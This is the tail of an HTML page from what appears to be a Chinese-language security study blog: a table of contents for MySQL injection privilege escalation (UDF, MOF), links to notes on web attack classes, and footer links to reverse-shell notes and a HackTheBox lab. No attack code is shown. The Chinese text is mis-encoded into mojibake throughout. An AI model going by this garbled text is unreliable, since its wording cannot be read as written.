class="toc-number">11.1.3.</span> <span class="toc-text">ææƒæ€è·¯</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux-UDF%E6%8F%90%E6%9D%83"><span class="toc-number">11.2.</span> <span class="toc-text">linux-UDFææƒ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">11.2.1.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">11.2.2.</span> <span class="toc-text">åˆ©ç”¨æ¡ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF-1"><span class="toc-number">11.2.3.</span> <span class="toc-text">ææƒæ€è·¯</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MOF%E6%8F%90%E6%9D%83"><span class="toc-number">11.3.</span> <span class="toc-text">MOFææƒ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">11.3.1.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2"><span class="toc-number">11.3.2.</span> <span class="toc-text">åˆ©ç”¨æ¡ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF-2"><span class="toc-number">11.3.3.</span> <span class="toc-text">ææƒæ€è·¯</span></a></li></ol></li></ol></li></ol></div><div class="related panel pjax" data-title="ç³»åˆ—æ–‡ç« "><ul><li><a href="/APT/web%E6%B8%97%E9%80%8F/AccessSQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="AccessSQLæ³¨å…¥">AccessSQLæ³¨å…¥</a></li><li class="active"><a href="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="MySQLæ³¨å…¥">MySQLæ³¨å…¥</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/MSSQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="MSSQLæ³¨å…¥">MSSQLæ³¨å…¥</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/XXE/" rel="bookmark" title="XXE">XXE</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/XSS/" rel="bookmark" title="XSS">XSS</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/CSRF/" rel="bookmark" title="CSRF">CSRF</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/SSRF/" rel="bookmark" title="SSRF">SSRF</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="bookmark" title="æ–‡ä»¶ä¸Šä¼ ">æ–‡ä»¶ä¸Šä¼ </a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="bookmark" title="æ–‡ä»¶åŒ…å«">æ–‡ä»¶åŒ…å«</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" rel="bookmark" title="ç›®å½•éå†">ç›®å½•éå†</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" rel="bookmark" title="å˜é‡è¦†ç›–">å˜é‡è¦†ç›–</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" rel="bookmark" title="æœªæˆæƒè®¿é—®">æœªæˆæƒè®¿é—®</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="bookmark" title="å‘½ä»¤æ‰§è¡Œ">å‘½ä»¤æ‰§è¡Œ</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" rel="bookmark" title="ä»£ç æ‰§è¡Œ">ä»£ç æ‰§è¡Œ</a></li><li><a href="/APT/web%E6%B8%97%E9%80%8F/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="bookmark" title="ååºåˆ—åŒ–">ååºåˆ—åŒ–</a></li></ul></div><div class="overview panel" data-title="ç«™ç‚¹æ¦‚è§ˆ"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="ä½™æ˜Ÿé…’" data-src="/images/avatar.jpg"><p class="name" itemprop="name">ä½™æ˜Ÿé…’</p><div class="description" itemprop="description">æ¬¢è¿å‚è§‚æˆ‘çš„ç¬”è®°ç©ºé—´ ~ è¿™é‡Œä¸»è¦ä¼šè®°å½•ä¸€äº›å®‰å…¨ç›¸å…³çš„å­¦ä¹ ç¬”è®° ğŸŒ¸</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">253</span> <span class="name">æ–‡ç« </span></a></div><div class="item categories"><a href="/categories/"><span class="count">43</span> <span class="name">åˆ†ç±»</span></a></div><div class="item tags"><a href="/tags/"><span class="count">36</span> <span class="name">æ ‡ç­¾</span></a></div></nav><div class="social"></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>é¦–é¡µ</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>å…³äº</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>æ–‡ç« </a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>å½’æ¡£</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>åˆ†ç±»</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>æ ‡ç­¾</a></li></ul></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/Program/golang/%E5%85%A5%E9%97%A8/%E8%BF%90%E7%AE%97%E7%AC%A6/" rel="prev" title="ä¸Šä¸€ç¯‡"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/APT/web%E6%B8%97%E9%80%8F/MSSQL%E6%B3%A8%E5%85%A5/" rel="next" title="ä¸‹ä¸€ç¯‡"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>éšæœºæ–‡ç« </h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/Program/" title="åˆ†ç±»äº ç¼–ç¨‹">ç¼–ç¨‹</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/" title="åˆ†ç±»äº Golang">Golang</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/%E5%B8%B8%E7%94%A8%E5%BA%93/" title="åˆ†ç±»äº å¸¸ç”¨åº“">å¸¸ç”¨åº“</a></div><span><a href="/Program/golang/%E5%B8%B8%E7%94%A8%E5%BA%93/flag/" title="flag">flag</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="åˆ†ç±»äº ç½‘ç»œ">ç½‘ç»œ</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/" title="åˆ†ç±»äº åä¸ºé˜²ç«å¢™">åä¸ºé˜²ç«å¢™</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/%E5%AE%9E%E9%AA%8C/" title="åˆ†ç±»äº å®éªŒ">å®éªŒ</a></div><span><a href="/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/%E5%AE%9E%E9%AA%8C/%E9%98%B2%E7%81%AB%E5%A2%99NAT%E9%85%8D%E7%BD%AE/" title="é˜²ç«å¢™NATé…ç½®">é˜²ç«å¢™NATé…ç½®</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/PDCERF/" title="åˆ†ç±»äº åº”æ€¥å“åº”">åº”æ€¥å“åº”</a> <i class="ic i-angle-right"></i> <a href="/categories/PDCERF/Linux%E5%BA%94%E6%80%A5%E7%AC%94%E8%AE%B0/" title="åˆ†ç±»äº Linuxåº”æ€¥ç¬”è®°">Linuxåº”æ€¥ç¬”è®°</a></div><span><a href="/PDCERF/Linux%E5%AE%9E%E6%88%98/SSH%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" title="SSHæš´åŠ›ç ´è§£">SSHæš´åŠ›ç ´è§£</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Program/" title="åˆ†ç±»äº ç¼–ç¨‹">ç¼–ç¨‹</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/" title="åˆ†ç±»äº Golang">Golang</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/%E5%B8%B8%E7%94%A8%E5%BA%93/" title="åˆ†ç±»äº å¸¸ç”¨åº“">å¸¸ç”¨åº“</a></div><span><a href="/Program/golang/%E5%B8%B8%E7%94%A8%E5%BA%93/sync/" title="sync">sync</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="åˆ†ç±»äº ç½‘ç»œ">ç½‘ç»œ</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/" title="åˆ†ç±»äº æ·±ä¿¡æœè®¾å¤‡">æ·±ä¿¡æœè®¾å¤‡</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E5%AE%9E%E9%AA%8C/" title="åˆ†ç±»äº å®éªŒ">å®éªŒ</a></div><span><a href="/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E9%98%B6%E6%AE%B5%E6%B5%8B%E8%AF%95/VPN/" title="VPN">VPN</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="åˆ†ç±»äº ç½‘ç»œ">ç½‘ç»œ</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/" title="åˆ†ç±»äº åä¸ºé˜²ç«å¢™">åä¸ºé˜²ç«å¢™</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/%E5%AE%9E%E9%AA%8C/" title="åˆ†ç±»äº å®éªŒ">å®éªŒ</a></div><span><a href="/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/%E5%AE%9E%E9%AA%8C/GREVPN%E5%AE%9E%E9%AA%8C/" title="GREVPNå®éªŒ">GREVPNå®éªŒ</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/PDCERF/" title="åˆ†ç±»äº åº”æ€¥å“åº”">åº”æ€¥å“åº”</a> <i class="ic i-angle-right"></i> <a href="/categories/PDCERF/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="åˆ†ç±»äº æµé‡åˆ†æ">æµé‡åˆ†æ</a></div><span><a href="/PDCERF/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/SQLMap/" title="SQLMap">SQLMap</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/Other/011-%E5%8F%8D%E5%BC%B9shell/009-Netcat%E5%8F%8D%E5%BC%B9shell/" title="æœªå‘½å">æœªå‘½å</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/APT/" title="åˆ†ç±»äº æ¸—é€æµ‹è¯•">æ¸—é€æµ‹è¯•</a> <i class="ic i-angle-right"></i> <a href="/categories/APT/%E9%9D%B6%E5%9C%BA/" title="åˆ†ç±»äº é¶åœº">é¶åœº</a></div><span><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/hachthebox/cozyhosting/" title="cozyhosting">cozyhosting</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/Other/011-%E5%8F%8D%E5%BC%B9shell/008-Ncat%E5%8F%8D%E5%BC%B9shell/" title="æœªå‘½å">æœªå‘½å</a></span></li></ul></div><div><h2>æœ€æ–°è¯„è®º</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 â€“ <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">ä½™æ˜Ÿé…’ @ ä½™æ˜Ÿé…’</span></div><div class="powered-by">åŸºäº <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"APT/webæ¸—é€/MySQLæ³¨å…¥/",favicon:{show:"ï¼ˆâ—Â´3ï½€â—ï¼‰ã‚„ã‚Œã‚„ã‚Œã ãœ",hide:"(Â´Ğ”ï½€)å¤§å¤‰ã ï¼"},search:{placeholder:"æ–‡ç« æœç´¢",empty:"å…³äº ã€Œ ${query} ã€ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœåˆ°",stats:"${time} ms å†…æ‰¾åˆ° ${hits} æ¡ç»“æœ"},valine:!0,fancybox:!0,copyright:'å¤åˆ¶æˆåŠŸï¼Œè½¬è½½è¯·éµå®ˆ <i class="ic i-creative-commons"></i>BY-NC-SA åè®®ã€‚',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->